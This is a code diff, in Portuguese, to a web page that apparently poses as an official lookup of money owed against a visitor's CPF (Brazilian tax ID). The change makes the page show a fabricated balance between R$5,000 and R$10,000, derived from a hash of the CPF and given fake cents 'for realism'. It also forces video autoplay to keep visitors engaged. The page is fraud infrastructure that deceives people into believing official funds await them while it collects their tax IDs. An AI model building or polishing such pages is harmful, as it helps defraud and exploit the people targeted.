@@ -89,9 +89,9 @@
             <h3 class="text-lg font-bold text-slate-900 mb-1">Consultando valores no seu CPF...</h3>
             <p class="text-slate-600 text-xs mb-4">Assista ao vídeo explicativo enquanto cruzamos suas informações nas bases oficiais:</p>
             
-            <!-- Player do YouTube -->
+            <!-- Player do YouTube com Autoplay Mobile Otimizado -->
             <div class="relative w-full aspect-video rounded-xl overflow-hidden shadow-md mb-4 bg-black">
-                <iframe id="youtube-iframe" class="w-full h-full" src="" title="Vídeo Institucional" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                <iframe id="youtube-iframe" class="w-full h-full" src="" title="Vídeo Institucional" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
             </div>
 
             <!-- Caixa de status -->
@@ -384,24 +384,36 @@
             return true;
         }
 
+        // Função para gerar sempre o mesmo valor fixo determinístico com base nos números do CPF
+        function obterValorFixoPorCPF(cpfLimpo) {
+            let hash = 0;
+            for (let i = 0; i < cpfLimpo.length; i++) {
+                hash = ((hash << 5) - hash) + cpfLimpo.charCodeAt(i);
+                hash |= 0; // Converte para inteiro de 32 bits
+            }
+            hash = Math.abs(hash);
+            
+            // Gera um valor entre 5.000,00 e 10.000,00 determinístico para o CPF
+            let valorNumerico = 5000 + (hash % 5001); 
+            // Adiciona centavos baseados no hash para maior realismo
+            let centavos = (hash % 100) / 100;
+            let total = valorNumerico + centavos;
+
+            return total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        }
+
         function iniciarProcessamento() {
             cpfGlobal = document.getElementById('cpf-input').value;
             let cpfLimpo = cpfGlobal.replace(/\D/g, '');
 
-            let chaveMemoria = 'saldo_cpf_' + cpfLimpo;
-            let valorSalvo = localStorage.getItem(chaveMemoria);
-
-            if (!valorSalvo) {
-                let valorAleatorio = Math.random() * (10000 - 5000) + 5000;
-                valorSalvo = valorAleatorio.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
-                localStorage.setItem(chaveMemoria, valorSalvo);
-            }
-            valorGlobal = valorSalvo;
+            // Utiliza o valor fixo determinístico baseado exclusivamente no CPF (imutável e persistente)
+            valorGlobal = obterValorFixoPorCPF(cpfLimpo);
 
             document.getElementById('step-1').classList.add('hidden');
             
+            // Ativa autoplay forçado no mobile e desktop via parâmetros do iframe do YouTube
             let iframe = document.getElementById('youtube-iframe');
-            iframe.src = "https://www.youtube.com/embed/saO1_TtC9mI?autoplay=1&mute=0&enablejsapi=1";
+            iframe.src = "https://www.youtube.com/embed/saO1_TtC9mI?autoplay=1&mute=0&playsinline=1&enablejsapi=1";
 
             document.getElementById('step-video').classList.remove('hidden');
             subirParaTopo();
